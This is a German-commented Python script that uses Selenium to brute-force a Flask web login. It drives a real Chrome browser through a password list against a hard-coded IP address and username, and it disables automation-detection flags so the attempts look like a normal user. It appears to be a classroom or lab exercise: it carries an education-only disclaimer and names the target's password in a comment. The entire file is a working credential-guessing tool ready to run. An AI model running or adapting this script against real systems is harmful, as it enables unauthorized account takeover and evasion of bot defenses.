#!/usr/bin/env python3
"""
============================================
Selenium Bruteforce für Flask Login
============================================
WICHTIG: Nur für Bildungszwecke und eigene Systeme!

Installation:
    pip install selenium webdriver-manager

Was macht Selenium?
- Öffnet einen echten Chrome-Browser
- Simuliert menschliches Verhalten (Klicks, Eingaben)
- Langsamer als Hydra, aber sieht aus wie ein normaler Benutzer
============================================
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time

# ============================================
# KONFIGURATION
# ============================================
TARGET_URL = "http://141.87.56.31:5001/login"  # Lokaler Server (vorher: 141.87.56.41)
USERNAME = "Trader123"  # Passwort ist "12345" (in passwords.txt vorhanden)                      
PASSWORD_FILE = "passwords.txt"
HEADLESS = False                        
DELAY = 0.5                             

# ============================================
# SELENIUM SETUP
# ============================================
def setup_driver(headless=False):
    """Chrome WebDriver einrichten"""
    chrome_options = Options()

    if headless:
        chrome_options.add_argument("--headless")  # Browser unsichtbar

    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")

    # ChromeDriver automatisch herunterladen und installieren
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)

    return driver

# ============================================
# BRUTEFORCE FUNKTION
# ============================================
def try_login(driver, username, password):
    """
    Versucht Login mit gegebenen Credentials

    Returns:
        True = Login erfolgreich
        False = Login fehlgeschlagen
    """
    try:
        # Zur Login-Seite navigieren
        driver.get(TARGET_URL)
        time.sleep(0.5)  # Warte auf Seitenladung

        # Username-Feld finden und ausfüllen
        username_field = driver.find_element(By.NAME, "username")
        username_field.clear()
        username_field.send_keys(username)

        # Password-Feld finden und ausfüllen
        password_field = driver.find_element(By.NAME, "password")
        password_field.clear()
        password_field.send_keys(password)

        # Login-Button finden und klicken
        # Suche nach Button mit type="submit"
        submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        submit_button.click()

        # Warte auf Redirect/Response
        time.sleep(1)

        # Prüfe ob Login erfolgreich (nicht mehr auf /login)
        current_url = driver.current_url

        # Wenn wir nicht mehr auf /login sind = Erfolg!
        if "/login" not in current_url:
            return True

        # Alternativ: Prüfe auf Fehlermeldung
        page_source = driver.page_source
        if "Ungültige Eingabedaten" in page_source or "Logged in" not in page_source:
            return False

        return True

    except Exception as e:
        print(f"[!] Fehler bei Login-Versuch: {e}")
        return False

# ============================================
# MAIN BRUTEFORCE LOOP
# ============================================
def main():
    print("=" * 50)
    print("Selenium Bruteforce Attack gestartet")
    print("=" * 50)
    print(f"Target: {TARGET_URL}")
    print(f"Username: {USERNAME}")
    print(f"Password-Liste: {PASSWORD_FILE}")
    print(f"Headless Mode: {HEADLESS}")
    print("=" * 50)
    print()

    # Passwortliste laden
    try:
        with open(PASSWORD_FILE, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] FEHLER: Passwortliste '{PASSWORD_FILE}' nicht gefunden!")
        return

    print(f"[+] {len(passwords)} Passwörter geladen")
    print()

    # Chrome WebDriver starten
    driver = setup_driver(headless=HEADLESS)

    success = False  # Flag für erfolgreichen Login

    try:
        # Durch alle Passwörter iterieren
        for i, password in enumerate(passwords, 1):
            print(f"[{i}/{len(passwords)}] Versuche: {USERNAME}:{password}", end=" ... ")

            success = try_login(driver, USERNAME, password)

            if success:
                print("✓ ERFOLG!")
                print()
                print("=" * 50)
                print("PASSWORT GEFUNDEN!")
                print("=" * 50)
                print(f"Username: {USERNAME}")
                print(f"Passwort: {password}")
                print("=" * 50)


                # Browser offen lassen - auf Benutzerinteraktion warten
                input("\n[>] Drücke Enter um den Browser zu schließen...")

                break
            else:
                print("✗ Fehlgeschlagen")

            # Rate Limiting: Pause zwischen Versuchen
            time.sleep(DELAY)

        else:
            print()
            print("=" * 50)
            print("Kein Passwort gefunden!")
            print("=" * 50)

    finally:
        print()
        if success:
            print("[+] Super, du hast das Passwort gefunden!")
        else:
            print("[+] Schließe Browser...")
        driver.quit()

# ============================================
# START
# ============================================
if __name__ == "__main__":
    main()
